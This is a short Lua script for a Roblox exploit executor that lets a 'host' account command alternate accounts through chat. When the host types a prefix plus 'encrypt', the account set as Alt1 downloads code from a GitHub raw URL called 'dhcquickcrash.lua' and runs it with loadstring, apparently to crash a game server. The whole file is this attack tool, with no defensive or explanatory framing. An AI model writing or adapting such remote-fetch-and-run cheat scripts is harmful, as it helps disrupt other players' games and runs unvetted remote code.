-- chiiicken#3436


repeat task.wait() until game:IsLoaded()

if game.Players.LocalPlayer.UserId == getgenv().Settings.host then return end

for _, player in pairs(game:GetService("Players"):GetPlayers()) do
	
	if player.UserId == getgenv().Settings.host then
		player.Chatted:Connect(function(message)
			if message:match(getgenv().Settings.prefix .. "encrypt") then
				if game.Players.LocalPlayer.UserId == getgenv().Alts.Alt1 then
					print("this is alt1")
					loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dhcquickcrash.lua"))()
				else
					-- TODO: Remove else catch (This is to test if everything works fine)
					print("not alt1")
				end
			end
		end)
	end
	
end
